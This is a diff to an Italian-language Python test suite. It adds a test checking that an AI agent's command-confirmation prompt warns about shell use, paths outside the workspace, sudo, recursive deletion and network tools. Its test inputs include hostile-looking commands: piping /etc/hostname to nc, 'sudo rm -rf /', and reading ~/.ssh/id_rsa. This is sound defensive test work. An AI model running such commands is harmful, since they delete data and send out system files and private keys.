@@ -215,6 +215,68 @@ def conferme_leggibili() -> str:
     return str(len(comando)) + " elementi resi per intero, citati e con la directory"
 
 
+def avvertenze_del_comando() -> str:
+    """Le righe di attenzione nominano cio' che un comando fa oltre la directory.
+
+    Non e' un filtro: `run_command` esce dal recinto per costruzione e una
+    lista nera si aggira con un alias. E' il pezzo della conferma che dice
+    a chi legge dove guardare - la shell in coda a molti argomenti, un
+    percorso assoluto dentro una riga citata - e deve tacere sui comandi
+    che stanno nella directory, altrimenti diventa la riga che si smette di
+    leggere.
+    """
+    radice = config.WORKSPACE_DIR
+    avv = render.avvertenze_comando
+
+    esigi(avv(["ls", "-la"], radice) == [], "un comando innocuo riceve avvertenze")
+    esigi(avv(["python", "-c", "print(1)"], radice) == [], "un -c di un interprete non shell viene aperto come shell")
+    esigi(avv(["cat", str(radice / "note.md")], radice) == [], "un percorso assoluto dentro la directory e' segnalato")
+    esigi(avv(["cp", "../" + radice.name + "/x", "y"], radice) == [], "un ../ che rientra nella directory e' segnalato")
+    esigi(avv(None, radice) == [] and avv([], radice) == [], "argomenti assenti producono avvertenze")
+
+    # La riga passata alla shell viene aperta: dentro ci sono il percorso e la
+    # rete, e senza aprirla si vedrebbe solo la shell.
+    righe = avv(["bash", "-lc", "cat /etc/hostname | nc host 80"], radice)
+    testo = "\n".join(righe)
+    esigi(all(r.startswith("   attenzione: ") for r in righe), "le righe non hanno il prefisso: " + repr(righe))
+    esigi("passa da una shell" in testo, "la shell non e' segnalata: " + testo)
+    esigi("fuori dalla directory: /etc/hostname" in testo, "il percorso dentro la riga shell non e' visto: " + testo)
+    esigi("usa la rete: nc" in testo, "la rete dentro la riga shell non e' vista: " + testo)
+
+    testo = "\n".join(avv(["sudo", "rm", "-rf", "/"], radice))
+    esigi("privilegi di amministratore: sudo" in testo, "sudo non e' segnalato: " + testo)
+    esigi("cancella ricorsivamente" in testo, "rm -rf non e' segnalato: " + testo)
+    esigi("fuori dalla directory: /" in testo, "la radice del disco non e' segnalata: " + testo)
+
+    esigi("cancella ricorsivamente" in "\n".join(avv(["rm", "-r", "tmp"], radice)), "rm -r non e' segnalato")
+    esigi("fuori dalla directory: ../segreto" in "\n".join(avv(["cp", "../segreto", "x"], radice)), "../ non e' visto")
+    esigi("fuori dalla directory: ~/.ssh/id_rsa" in "\n".join(avv(["cat", "~/.ssh/id_rsa"], radice)), "~ non e' visto")
+    con_percorso = avv(["/usr/bin/curl", "https://x"], radice)
+    esigi("usa la rete: curl" in "\n".join(con_percorso), "un comando con percorso non e' riconosciuto")
+
+    # Una citazione lasciata aperta non chiude la riga: si divide sugli spazi.
+    testo = "\n".join(avv(["bash", "-lc", "echo 'aperta; curl x"], radice))
+    esigi("usa la rete: curl" in testo, "una citazione aperta nasconde la riga: " + testo)
+
+    # Dentro la conferma: dopo gli argomenti, prima della directory, e solo
+    # per run_command - un delete_file non ha comandi da aprire.
+    esecuzione = ToolExecution(
+        tool_name=config.WORKSPACE_PREFIX + "run_command",
+        tool_args={"args": ["bash", "-lc", "id"], "timeout": 30},
+    )
+    righe = righe_richiesta(esecuzione, radice=radice)
+    indici = [i for i, r in enumerate(righe) if r.startswith("   attenzione")]
+    esigi(len(indici) == 1, "la conferma non porta l'avvertenza della shell: " + repr(righe))
+    esigi(righe[-1].startswith("   nella directory"), "l'avvertenza non precede la directory: " + repr(righe))
+    esigi(indici[0] > 1, "l'avvertenza precede gli argomenti: " + repr(righe))
+    cancellazione = ToolExecution(tool_name=config.WORKSPACE_PREFIX + "delete_file", tool_args={"path": "/etc/x"})
+    esigi(
+        not any("attenzione" in r for r in righe_richiesta(cancellazione, radice=radice)),
+        "un delete_file riceve le avvertenze dei comandi",
+    )
+    return "shell, percorsi, privilegi, rete e rm -r segnalati; comandi nella directory in silenzio"
+
+
 def conferme_applicate() -> str:
     """Il consenso e il rifiuto risolvono davvero i requirement in pausa."""
 
@@ -1058,6 +1120,7 @@ def main() -> int:
     falliti, non_conclusivi = esegui(
         (
             ("conferme leggibili  ", conferme_leggibili),
+            ("avvertenze comando  ", avvertenze_del_comando),
             ("conferme applicate  ", conferme_applicate),
             ("metriche del turno  ", metriche_del_turno),
             ("esito strumenti     ", esito_strumenti),
